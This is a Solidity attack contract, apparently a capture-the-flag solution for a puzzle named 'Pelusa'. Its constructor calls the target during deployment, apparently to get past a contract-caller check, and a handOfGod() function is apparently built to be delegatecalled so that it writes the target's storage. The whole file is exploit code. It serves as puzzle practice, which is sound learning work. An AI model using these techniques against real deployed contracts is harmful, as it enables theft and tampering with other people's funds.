// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Create2} from "openzeppelin-contracts/utils/Create2.sol";

contract PelusaAttack {
    uint256 public slotZero;
    uint256 public slotOne;

    address public admin;

    error TransactionFailed();

    function getCallData() internal pure returns (bytes memory) {
        return abi.encodeWithSignature("passTheBall()");
    }

    constructor(address _admin,address target) {
        admin = _admin;
        (bool success,) = target.call(getCallData());

        if(!success) revert TransactionFailed();
    }

    function handOfGod() external returns (uint256) {
        slotOne = 2;
        return 22_06_1986;
    }

    function getBallPossesion() external view returns (address) {
        return admin;
    }
}